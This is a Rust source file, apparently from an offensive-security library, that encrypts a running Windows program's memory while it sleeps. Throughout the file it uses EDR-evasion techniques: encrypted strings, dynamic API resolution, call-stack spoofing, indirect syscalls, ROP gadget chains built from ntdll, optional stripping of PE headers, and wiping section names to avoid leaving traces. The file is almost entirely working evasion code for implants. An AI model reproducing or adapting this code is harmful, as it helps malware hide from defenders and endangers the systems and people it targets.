#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use nanorand::{Rng, WyRand, BufferedRng};
use std::ffi::CString;
use std::{ptr, mem};
use std::{ptr::copy_nonoverlapping, mem::size_of, ffi::c_void};
use std::mem::transmute;
use windows::Win32::{Foundation::HANDLE, System::{Diagnostics::Debug::{IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER}, SystemInformation::SYSTEM_INFO, Memory::MEMORY_BASIC_INFORMATION, Threading::GetCurrentProcess}};
use dinvoke_rs::data::{PVOID, PeMetadata, ImageFileHeader, ImageOptionalHeader64, EAT, SECTION_MEM_READ, SECTION_MEM_WRITE, SECTION_MEM_EXECUTE, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_WRITECOPY, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, BCryptOpenAlgorithmProvider, BCryptGetProperty, BCryptSetProperty, BCryptGenerateSymmetricKey, CreateEventW, BCryptCloseAlgorithmProvider, BCryptDestroyKey};

#[repr(C)]
struct RopConfiguration
{
    god_gadget: PVOID,
    gadget1: PVOID,
    gadget2: PVOID,
    gadget3: PVOID,
    gadget4: PVOID,
    gadget5: PVOID,
    gadget6: PVOID,
    gadget7: PVOID,
    gadget8: PVOID,
    gadget9: PVOID,

    ntprotectvm: usize,
    ntprotectvm_id: isize,
    processhandle: HANDLE,
    memory_protections: usize,
   
    ntwaitobj: usize,
    ntwaitobj_id: isize,
    objhandle: HANDLE,
    delay: *mut isize,

    bencrypt: usize,
    bdecrypt: usize,
    key_handle: PVOID, 
    iv_len: usize,
    output_var: PVOID, 
}

#[repr(C)]
struct SectionInfo{
    section_address: *mut PVOID,
    section_size: *mut usize,
    original_protection: usize,
    output: PVOID,
}

#[repr(C)]
struct SectionsWrapper {
    base_address: *mut PVOID,
    total_size: *mut usize,  
    iv_e: PVOID,
    iv_d: PVOID,
    n: usize,
    sec_size: usize,
    sections: Vec<SectionInfo>,
}

extern "C"
{
    fn SpoofAndCall(unwinder: usize, args: Vec<*mut c_void>, is_syscall: bool, id: u32);
    fn Fluctuate(config_structure: PVOID, sections_structure: PVOID);
}

/// Encrypt the whole PE. Use this function in order to specify a two bytes pattern that the library will look for to retrieve the module's base address. These two bytes replace
/// the classic MZ PE magic bytes, allowing you to remove PE headers to hide the pressence of the binary.
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
///   
///   - pattern: A two bytes pattern that will indicate the start of the PE in memory. The MZ magic bytes should be replaced by these two bytes. 
pub fn fluctuate_from_pattern(config_delay: Option<u32>, event_handle: Option<HANDLE>, pattern: [u8;2]) -> Result<(), String>
{
    fluctuate_core(true, config_delay, event_handle, 0, Some(pattern))
}

/// Encrypt the whole PE. Use this function in order to specify the base_address of the current PE, preventing the library from searching the MZ pattern. 
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
///   
///   - base_address: This is the PE base address. 
pub fn fluctuate_from_address(config_delay: Option<u32>, event_handle: Option<HANDLE>, base_adress: usize) -> Result<(), String>
{
    fluctuate_core(true, config_delay, event_handle, base_adress, None)
}

/// Encrypt either the current memory region or the whole PE. 
///  - config_encryptall: Encrypt all sections from the PE or just the current memory region where the main program resides.
///                       Keep in mind that, to be able to encrypt all sections, PE's magic bytes shouldn't be stripped.
///                       For more information check out the implementation of get_pe_baseaddress function. If the header is not
///                       found, the configuration will automatically change to encrypt only current memory region.
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
pub fn fluctuate(config_encryptall: bool, config_delay: Option<u32>, event_handle: Option<HANDLE>) -> Result<(), String>
{
    fluctuate_core(config_encryptall, config_delay, event_handle, 0, None)
}

fn fluctuate_core(config_encryptall: bool, config_delay: Option<u32>, event_handle: Option<HANDLE>, specified_base_address: usize, pattern: Option<[u8;2]>) -> Result<(), String>
{
    let iv_size: usize = 16;
    let mut aes_128_key = [0u8; 16];
    let mut aes_iv = [0u8; 16]; 

    // Dynamically generate the encryption key and IV
    let mut rng = BufferedRng::new(WyRand::new());
    rng.fill(&mut aes_128_key);
    let mut aes_128_key: Vec<u8> = aes_128_key.to_vec();
    rng.fill(&mut aes_iv);
    let aes_iv: Vec<u8> = aes_iv.to_vec();

   unsafe
   {
        let mut configuration: RopConfiguration = std::mem::zeroed();
        
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll")); 
        let load_library_address = dinvoke_rs::dinvoke::get_function_address(k32, &lc!("LoadLibraryA"));
        let name = CString::new(lc!("bcrypt.dll")).expect("");

        // Use Unwinder to create a clean call stack before loading bcrypt.dll. This way, the call stack won't be a problem
        // when the LoadImage callback is analyzed by the EDR.
        let bcrypt = unwinder::call_function!(load_library_address, false, name.as_ptr() as *mut u8) as isize;
        if bcrypt == 0
        {
            return Err(lc!("[X] Error loading bcrypt into the current process."));
        }

        let alg_handle = HANDLE::default();
        let alg_handle: *mut HANDLE = transmute(&alg_handle);
        let mut alg_id: Vec<u16> = "AES".encode_utf16().collect(); // BCRYPT_AES_ALGORITHM
        alg_id.push(0);
        let flags = 0;
        let function: BCryptOpenAlgorithmProvider;
        let ret_value: Option<i32>;

        // Open a handle to the AES encryption provider
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptOpenAlgorithmProvider"),function,ret_value,alg_handle,alg_id.as_ptr(),ptr::null(),flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptOpenAlgorithmProvider."));
        }
        
        let mut bcrypt_object_length: Vec<u16> = "ObjectLength".encode_utf16().collect(); // BCRYPT_AES_ALGORITHM
        bcrypt_object_length.push(0);
        let cb_key_object = 0u32;
        let cb_key_object: *mut u8 = transmute(&cb_key_object);
        let buffer_size = 4u32;
        let cb_data = 0u32;
        let cb_data: *mut u32 = transmute(&cb_data);
        let flags = 0u32;
        let function: BCryptGetProperty;
        let ret_value: Option<i32>;

        // We obtain the size of the buffer where the encryption key is to be stored
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptGetProperty"),function,ret_value,*alg_handle,bcrypt_object_length.as_ptr(),cb_key_object,buffer_size,cb_data,flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptGetProperty."));
        }

        let cb_key_object = *(cb_key_object as *mut u32);
        let mut pb_key_object = vec![0u8;cb_key_object as usize];

        let mut bcrypt_chaining_mode: Vec<u16> = "ChainingMode".encode_utf16().collect(); // BCRYPT_CHAINING_MODE
        bcrypt_chaining_mode.push(0);
        let mut chaining_mode: Vec<u16> = "ChainingModeCBC".encode_utf16().collect(); // BCRYPT_CHAIN_MODE_CBC
        chaining_mode.push(0);
        let buffer_size = chaining_mode.len() as u32;
        let flags = 0u32;
        let function: BCryptSetProperty;
        let ret_value: Option<i32>;

        // We indicate the encryption provider that we want to use AES in CBC mode
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptSetProperty"),function,ret_value,*alg_handle,bcrypt_chaining_mode.as_ptr(),chaining_mode.as_mut_ptr() as *mut _,buffer_size,flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptSetProperty."));
        }
        
        let f: BCryptGenerateSymmetricKey;
        let r: Option<i32>;
        let key_handle = HANDLE::default();
        let key_handle : *mut HANDLE = transmute(&key_handle);
        let aes_key_len = aes_128_key.len() as u32;

        // Generate encryption key
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptGenerateSymmetricKey"),f,r,*alg_handle,key_handle,pb_key_object.as_mut_ptr(),cb_key_object,aes_128_key.as_mut_ptr(),aes_key_len,0);
        if r.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptGenerateSymmetricKey."));
        }

        let ntdll = dinvoke_rs::dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let ntdll_ba: *const u8 =  ntdll as _;
        let ntdll_pe_info = get_pe_metadata(ntdll_ba).unwrap();

        let ntdll_eat = dinvoke_rs::dinvoke::get_ntdll_eat(ntdll);
        let ntpvm_id = dinvoke_rs::dinvoke::get_syscall_id(&ntdll_eat, &lc!("NtProtectVirtualMemory"));
        let ntwaitobj_id = dinvoke_rs::dinvoke::get_syscall_id(&ntdll_eat, &lc!("NtWaitForSingleObject"));

        if ntpvm_id == u32::MAX || ntwaitobj_id == u32::MAX
        {
            return Err(lc!("[X] Couldn't retrieve SSNs."));
        }
        
        let mut syscall_addr1: usize = 0;
        let mut syscall_addr2: usize = 0;
        let ntprotectvm_address = dinvoke_rs::dinvoke::get_function_address(ntdll, &lc!("NtProtectVirtualMemory")) as *mut c_void;
        let ntwaitobj_address = dinvoke_rs::dinvoke::get_function_address(ntdll, &lc!("NtWaitForSingleObject")) as *mut c_void;

        // Check if functions were succesfully found
        if ntprotectvm_address != ptr::null_mut() {
            syscall_addr1 = get_syscall_addr(ntprotectvm_address as isize);
        }
        if ntwaitobj_address != ptr::null_mut() {
            syscall_addr2 = get_syscall_addr(ntwaitobj_address as isize);
        }

        // If the original syscall instruction is hooked/not found, then get a random one
        if syscall_addr1 == 0 {
            syscall_addr1 = get_random_syscall(&ntdll_eat);
        }

        if syscall_addr2 == 0 {
            syscall_addr2 = get_random_syscall(&ntdll_eat);
        }

        if syscall_addr1 == 0 || syscall_addr2 == 0
        {
            return Err(lc!("[X] Syscall gadgets not found."));
        }

        let sections_wrapper: SectionsWrapper;

        let mut page = 0usize; 
        let mut page_length = 0usize;
        let mut pe_base = 0usize;
        let mut total_size = 0usize;

        let mut config_encrypt_all_sections = config_encryptall;

        // In case parsing the header of the current PE fails, only the current section will be encrypted
        if config_encrypt_all_sections {
            if specified_base_address != 0
            {
                pe_base = specified_base_address;
            }
            else if pattern.is_some()
            {
                pe_base = get_pe_baseaddress(5, pattern.unwrap());
            }
            else 
            {
                pe_base = get_pe_baseaddress(5, [0x4D, 0x5A]);
            }

            if pe_base == 0 {
                config_encrypt_all_sections = false;
            }
        }

        if config_encrypt_all_sections 
        {
            let pe_ba: *const u8 =  std::mem::transmute(pe_base);
            let mut current_pe = get_pe_metadata(pe_ba).unwrap();

            // Array that will contain each SectionInfo
            let mut sections_array: Vec<SectionInfo> = vec![];

            // Retrieve the PE Header's section information
            let base_of_code;
            if current_pe.is_32_bit {
                base_of_code = current_pe.opt_header_32.BaseOfCode as usize;
            } else {
                base_of_code = current_pe.opt_header_64.base_of_code as usize;
            }

            let section_size: usize = base_of_code;
            let section_address: usize = pe_base;
            let section_protection: u32 = PAGE_READONLY;
            
            let mut new_section: SectionInfo = std::mem::zeroed();
            
            let alloc_base_address: Box<*mut c_void> = Box::new(section_address as *mut c_void);
            new_section.section_address = Box::into_raw(alloc_base_address);
            
            new_section.original_protection = section_protection as usize;
            
            let alloc_section_size: Box<usize> = Box::new(align_to_mempage(section_size));
            new_section.section_size = Box::into_raw(alloc_section_size);

            let alloc_output: Box<u32> = Box::new(0);
            new_section.output = Box::into_raw(alloc_output) as *mut c_void;

            sections_array.push(new_section);

            // Retrieve other sections' information
            //  This data needs to be stored in the heap. Otherwise, it will be overwritten by the next element of the loop.
            for section in current_pe.sections.iter_mut()
            {   

                let section_size: usize = section.Misc.VirtualSize as usize;
                let section_address: usize = pe_base + section.VirtualAddress as usize;

                let read = section.Characteristics.0 & SECTION_MEM_READ != 0;
                let write = section.Characteristics.0 & SECTION_MEM_WRITE != 0;
                let execute = section.Characteristics.0 & SECTION_MEM_EXECUTE != 0;
                let section_protection: u32;

                if read && !write && !execute {
                    section_protection = PAGE_READONLY;
                } else if read && write && !execute {
                    section_protection = PAGE_READWRITE;
                } else if read && write && execute {
                    section_protection = PAGE_EXECUTE_READWRITE;
                } else if read && !write && execute {
                    section_protection = PAGE_EXECUTE_READ;
                } else if !read && write && !execute {
                    section_protection = PAGE_WRITECOPY; 
                } else if !read && write && execute {
                    section_protection = PAGE_EXECUTE_WRITECOPY;  
                } else if !read && !write && execute {
                    section_protection = PAGE_EXECUTE;  
                } else {
                    continue
                }

                let mut new_section: SectionInfo = std::mem::zeroed();

                let alloc_base_address: Box<*mut c_void> = Box::new(section_address as *mut c_void);
                new_section.section_address = Box::into_raw(alloc_base_address);

                new_section.original_protection = section_protection as usize;

                let alloc_section_size: Box<usize> = Box::new(align_to_mempage(section_size));
                new_section.section_size = Box::into_raw(alloc_section_size);

                let alloc_output: Box<u32> = Box::new(0);
                new_section.output = Box::into_raw(alloc_output) as *mut c_void;

                sections_array.push(new_section); 

                // We force heap overwriting to prevent from leaving traces  
                for i in 0..8
                {
                    if section.Name[i] != 0{
                        section.Name[i] = 0;
                    }
                    else{
                        break;
                    }
                }
            }

            // Calculate the total size of the PE
            for s in &sections_array
            {
                total_size += *s.section_size;
            }

            let total: *mut usize = transmute(&total_size);
            let base_addr: *mut *mut c_void = transmute(&pe_base);

            // As BCrypt functions may modify the contents of the IV buffer, it is necessary to allocate one for each operation (encrypt/decrypt)
            let mut allocated_iv1: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            let mut allocated_iv2: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv1.as_mut_ptr(), iv_size); 
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv2.as_mut_ptr(), iv_size); 
           
            sections_wrapper = SectionsWrapper {
                base_address: base_addr as _,
                total_size: total as _,
                iv_e: Box::into_raw(allocated_iv1) as *mut c_void,
                iv_d: Box::into_raw(allocated_iv2) as *mut c_void,
                n: sections_array.len(),
                sec_size: mem::size_of::<SectionInfo>(),
                sections: sections_array,
            };

        } 
        else 
        {   // Encrypt only the current section

            let b = vec![0u8; size_of::<SYSTEM_INFO>()];
            let si: *mut SYSTEM_INFO = std::mem::transmute(b.as_ptr());
            dinvoke_rs::dinvoke::get_system_info(si);
            let main_address = fluctuate as usize;

            let mut mem = 0usize;
            let max = (*si).lpMaximumApplicationAddress as usize;
           
            let mut page_protection = PAGE_NOACCESS;

            while mem < max
            {
                let buffer = vec![0u8; size_of::<MEMORY_BASIC_INFORMATION>()];
                let buffer: *mut MEMORY_BASIC_INFORMATION = std::mem::transmute(buffer.as_ptr());
                let length = size_of::<MEMORY_BASIC_INFORMATION>();
                let _r = dinvoke_rs::dinvoke::virtual_query_ex(
                    GetCurrentProcess(), 
                    mem as *const c_void, 
                    buffer, 
                    length
                );
                
                if main_address >= ((*buffer).BaseAddress as usize) && main_address <= ((*buffer).BaseAddress as usize + (*buffer).RegionSize )
                {
                    page = (*buffer).BaseAddress as usize;
                    page_length = (*buffer).RegionSize;

                    page_protection = (*buffer).Protect.0;
                    break;
                }

                mem = (*buffer).BaseAddress as usize + (*buffer).RegionSize;
            }

            if page == 0 || page_length == 0 
            {
                return Err(lc!("[X] Error retrieving current section information."));
            }

            // Initialize Sections structure
            let mut sections_array: Vec<SectionInfo> = vec![];

            let mut new_section: SectionInfo = std::mem::zeroed();
            new_section.section_address = transmute(&page);
            new_section.section_size = transmute(&page_length);

            let output = 0u32;
            let output_ptr: *mut u32 = transmute(&output);
            new_section.output = transmute(output_ptr);

            // As BCrypt functions may modify the contents of the IV buffer, it is necessary to allocate one for each operation (encrypt/decrypt)
            let mut allocated_iv1: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            let mut allocated_iv2: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv1.as_mut_ptr(), iv_size); 
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv2.as_mut_ptr(), iv_size); 

            let section_protection: u32;

            if page_protection == PAGE_READONLY {
                section_protection = PAGE_READONLY;
            } else if page_protection  == PAGE_READWRITE {
                section_protection = PAGE_READWRITE;
            } else if page_protection  == PAGE_EXECUTE_READWRITE {
                section_protection = PAGE_EXECUTE_READWRITE;
            } else if page_protection  == PAGE_EXECUTE_READ {
                section_protection = PAGE_EXECUTE_READ;
            } else if page_protection  == PAGE_WRITECOPY {
                section_protection = PAGE_WRITECOPY; 
            } else if page_protection  == PAGE_EXECUTE_WRITECOPY {
                section_protection = PAGE_EXECUTE_WRITECOPY;  
            } else if page_protection  == PAGE_EXECUTE {
                section_protection = PAGE_EXECUTE;
            } else {
                return Err(lc!("[X] Memory permissions error."));
            }

            new_section.original_protection = section_protection as usize;
           
            sections_array.push(new_section);

            sections_wrapper = SectionsWrapper {
                base_address: sections_array[0].section_address,
                total_size: sections_array[0].section_size,
                iv_e: Box::into_raw(allocated_iv1) as *mut c_void,
                iv_d: Box::into_raw(allocated_iv2) as *mut c_void,
                n: 1,
                sec_size: mem::size_of::<SectionInfo>(),
                sections: sections_array,
            };

        }

        let god_gadget: [u8; 12] = [0x58, 0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop rax; pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; ret;
        let gadget_1: [u8;2] = [0x59, 0xc3]; // pop rcx; ret;
        let gadget_2: [u8;4] = [0x5A, 0x41, 0x5B, 0xc3]; // pop rdx; pop r11; ret;
        let gadget_3: [u8;3] = [0x41, 0x58, 0xc3]; // pop r8; ret;
        let gadget_4: [u8;7] = [0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop r9; pop r10; pop r11; ret;
        let gadget_5: [u8;5] = [0x48, 0x83, 0xC4, 0x58, 0xC3]; // add rsp, 0x58; ret;  -> ideally it would be 0x50, but it can't be found on ntdll
        let gadget_6: [u8;5] = [0x48, 0x83, 0xC4, 0x28, 0xC3]; // add rsp, 0x28; ret;  -> ideally it would be 0x20, but it can't be found on ntdll
        let gadget_7: [u8;1] = [0xC3]; // ret
        let gadget_8: [u8;5] = [0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop r10; pop r11; ret;
        let gadget_9: [u8;2] = [0x58, 0xC3]; //pop rax; ret;
        
        let mut god_addr = 0usize;
        let mut gag1_addr = 0usize;
        let mut gag2_addr = 0usize;
        let mut gag3_addr = 0usize;
        let mut gag4_addr = 0usize;
        let mut gag5_addr = 0usize;
        let mut gag6_addr = 0usize;
        let mut gag7_addr = 0usize;
        let mut gag8_addr = 0usize;
        let mut gag9_addr = 0usize;

        for section in ntdll_pe_info.sections
        {   
            let s = std::str::from_utf8(&section.Name).unwrap();

            if s.contains(".text")
            {
                let dst: Vec<u8> =vec![0;section.Misc.VirtualSize as usize];
                let dir = ntdll as i64 + section.VirtualAddress as i64;
                copy_nonoverlapping((dir as isize) as *mut u8, dst.as_ptr() as *mut u8, section.Misc.VirtualSize as usize);

                god_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    god_gadget.as_ptr(), 
                                    god_gadget.len());

                // If god gadget is not found, then we use regular gadgets
                if god_addr == ntdll as usize + section.VirtualAddress as usize
                {
                    god_addr = 0;

                    gag1_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_1.as_ptr(), 
                                        gadget_1.len());
                    gag2_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_2.as_ptr(), 
                                        gadget_2.len());
                    gag3_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_3.as_ptr(), 
                                        gadget_3.len());
                    gag4_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_4.as_ptr(), 
                                        gadget_4.len());
                    gag8_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_8.as_ptr(), 
                                        gadget_8.len()); 
                    gag9_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_9.as_ptr(), 
                                        gadget_9.len());      
                    
                }

                gag5_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_5.as_ptr(), 
                                    gadget_5.len()); 
                gag6_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_6.as_ptr(), 
                                    gadget_6.len());  
                gag7_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_7.as_ptr(), 
                                    gadget_7.len());                                             
            }
        }

        if god_addr == 0 && (gag1_addr == 0 || gag2_addr == 0 || gag3_addr == 0 || gag4_addr == 0 || gag5_addr == 0 || gag6_addr == 0 || gag7_addr == 0 || gag8_addr == 0 || gag9_addr == 0)
        {
            return Err(lc!("[X] Gadget not found."));
        }
        
        if god_addr == 1 && (gag5_addr == 0 || gag6_addr == 0 || gag7_addr == 0)
        {
            return Err(lc!("[X] Gadget not found."));
        }

        // ROP Configuration
        //  Gadgets
        configuration.god_gadget = god_addr as *mut _;
        configuration.gadget1 = gag1_addr as *mut _;
        configuration.gadget2 = gag2_addr as *mut _;
        configuration.gadget3 = gag3_addr as *mut _;
        configuration.gadget4 = gag4_addr as *mut _;
        configuration.gadget5 = gag5_addr as *mut _;
        configuration.gadget6 = gag6_addr as *mut _;
        configuration.gadget7 = gag7_addr as *mut _;
        configuration.gadget8 = gag8_addr as *mut _;
        configuration.gadget9 = gag9_addr as *mut _;

        //  NtProtectVirtualMemory
        let protection = dinvoke_rs::data::PAGE_READWRITE as usize;
        let current_process_handle: HANDLE = HANDLE(-1);

        configuration.ntprotectvm = syscall_addr1 as usize;
        configuration.ntprotectvm_id = ntpvm_id as isize;
        configuration.processhandle = current_process_handle;
        configuration.memory_protections = protection as usize;

        //  CreateEventW
        let function: CreateEventW;
        let ret: Option<HANDLE>;
        let objhandle: HANDLE;

        let mut config_is_handle_provided: bool = false;
        match event_handle {
            Some(h) => {
                config_is_handle_provided = true;
                objhandle = h;
            },
            None => {
                dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateEventW"),function,ret,ptr::null_mut(),0,0,ptr::null());
                match ret {
                    Some(h) => {
                        objhandle = h;
                    },
                    None => {
                        return Err(lc!("[X] Error calling CreateEventW."));
                    },
                }
            },
        }

        //  NtWaitForSingleObject
        let delay_value: i64;
        let delay: *mut isize;

        match config_delay {
            Some(seconds) => {
                delay_value = seconds as i64 * -10000000;
                delay = transmute(&delay_value);
            },
            None => {
                // If a value is not specified, the timeout will be Infinite
                delay = std::ptr::null_mut();
            }
        }
        
        configuration.ntwaitobj = syscall_addr2 as usize;
        configuration.ntwaitobj_id = ntwaitobj_id as isize;
        configuration.objhandle = objhandle;
        configuration.delay = delay as *mut isize;

        //  Encryption
        configuration.key_handle = transmute(key_handle);
        configuration.iv_len = iv_size;
        let output_var = 0u32;
        let output_var_ptr: *mut u32 = transmute(&output_var);
        configuration.output_var = transmute(output_var_ptr);
       
        let bcryptencrypt_addr = dinvoke_rs::dinvoke::get_function_address(bcrypt, &lc!("BCryptEncrypt"));
        configuration.bencrypt = bcryptencrypt_addr as usize;
 
        let bcryptdecrypt_addr = dinvoke_rs::dinvoke::get_function_address(bcrypt, &lc!("BCryptDecrypt"));
        configuration.bdecrypt = bcryptdecrypt_addr as usize;

        // Call Unwinder::SpoofAndCall to get a clean call stack for the rop chain
        let rop_configuration: PVOID = transmute(&configuration);
        let sections_configuration: PVOID = transmute(&sections_wrapper);
        let encrypt_addr: *mut c_void = Fluctuate as _;
        
        let unwinder_addr = unwinder::spoof_and_call as usize;
        let mut args: Vec<*mut c_void> = vec![];
        let keep_start_address_frame = false;
        let keep_start_address_frame_ptr = keep_start_address_frame as usize;
        args.push(encrypt_addr);
        args.push(keep_start_address_frame_ptr as _);
        args.push(rop_configuration);
        args.push(sections_configuration);

        let _ = SpoofAndCall(unwinder_addr, args, false, 0);
       
        // Clean Up
        if !config_is_handle_provided {
            // Close the event handle
            let _ = dinvoke_rs::dinvoke::close_handle(objhandle);
        }

        let flags = 0;
        let f: BCryptCloseAlgorithmProvider;
        let _r: Option<i32>;
        // Close handle to the encryption algorithm provider
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptCloseAlgorithmProvider"),f,_r,*alg_handle,flags);
        
        let f: BCryptDestroyKey;
        let _r: Option<i32>;
        // Destroy encryption key
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptDestroyKey"),f,_r,*key_handle);

        // Allow the destructor to free the allocated memory
        let _ = Box::from_raw(sections_wrapper.iv_e);
        let _ = Box::from_raw(sections_wrapper.iv_d);

        if config_encrypt_all_sections {
            for sect in &sections_wrapper.sections{
                let _ = Box::from_raw((*sect).section_address);
                let _ = Box::from_raw((*sect).section_size);
                let _ = Box::from_raw((*sect).output);
            }
        }
   }

   Ok(())
   
}

fn get_gadget_offset(base_address: *const u8, section_size: u32,  gadget: *const u8, gadget_len: usize) -> usize
{   
    unsafe
    {
        let mut found = false;
        let mut ptr = base_address;

        for i in 0..section_size as usize
        { 
            for j in 0..gadget_len
            {
                let t = ptr.add(j); 
                let temp_1 = *(t);
                let t2 = gadget.add(j); 
                let temp_2 = *(t2);
                if temp_1 == temp_2
                {
                    if found && j as i32 == (gadget_len as i32 - 1)
                    {
                        let offset = base_address.add(i) as usize - base_address as usize;
                        return offset;
                    }
                    found = true;
                }
                else 
                {
                    found = false;   
                    break;
                }
            }
            ptr = ptr.add(1);

        }
    }  
    0
}

/// Retrieves PE headers information from the module base address.
///
/// It will return either a dinvoke_rs::data::PeMetada struct containing the PE
/// metadata or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let file_content = fs::read("c:\\windows\\system32\\ntdll.dll").expect("[x] Error opening the specified file.");
/// let file_content_ptr = file_content.as_ptr();
/// let result = manualmap::get_pe_metadata(file_content_ptr);
/// ```
fn get_pe_metadata (module_ptr: *const u8) -> Result<PeMetadata,String> {
    
    let mut pe_metadata= PeMetadata::default();

    unsafe {

        let e_lfanew = *((module_ptr as u64 + 0x3C) as *const u32);
        pe_metadata.image_file_header = *((module_ptr as u64 + e_lfanew as u64 + 0x4) as *mut ImageFileHeader);

        let opt_header: *const u16 = (module_ptr as u64 + e_lfanew as u64 + 0x18) as *const u16; 
        let pe_arch = *(opt_header);

        if pe_arch == 0x010B
        {
            pe_metadata.is_32_bit = true;
            let opt_header_content: *const IMAGE_OPTIONAL_HEADER32 = std::mem::transmute(opt_header);
            pe_metadata.opt_header_32 = *opt_header_content;
        }
        else if pe_arch == 0x020B 
        {
            pe_metadata.is_32_bit = false;
            let opt_header_content: *const ImageOptionalHeader64 = std::mem::transmute(opt_header);
            pe_metadata.opt_header_64 = *opt_header_content;
        } 
        else 
        {
            return Err(lc!("[x] Invalid magic value."));
        }

        let mut sections: Vec<IMAGE_SECTION_HEADER> = vec![];

        for i in 0..pe_metadata.image_file_header.number_of_sections
        {
            let section_ptr = (opt_header as u64 + pe_metadata.image_file_header.size_of_optional_header as u64 + (i * 0x28) as u64) as *const u8;
            let section_ptr: *const IMAGE_SECTION_HEADER = std::mem::transmute(section_ptr);
            sections.push(*section_ptr);
        }

        pe_metadata.sections = sections;

        Ok(pe_metadata)
    }
}

fn get_syscall_addr (base_address: isize) -> usize {

    let syscall_hex: [u8; 3] = [0x0f, 0x05, 0xC3];
    let offset;
   
    offset = get_gadget_offset(
        base_address as *const u8, 
        0x15 as u32, 
        syscall_hex.as_ptr(), 
        syscall_hex.len());

    if offset == 0 {
        return offset;
    } else {
        let gadget = base_address as usize + offset;
        return gadget;
    }
}

fn get_random_syscall (eat: &EAT,) -> usize {
   
    let mut rng = WyRand::new();
    if !eat.is_empty() {
        
        let mut address;
        let mut gadget;
    
        loop 
        {
            address = 0;
            while address == 0
            {
                let n: usize = rng.generate_range(0..eat.len()) as usize;
                let pair = eat.iter().skip(n).next().unwrap();
                address = *(pair.0);
            }

            gadget = get_syscall_addr(address);

            if gadget != 0 {
                break;
            }  
        } 

        return gadget;
    }

    return 0;
    
}
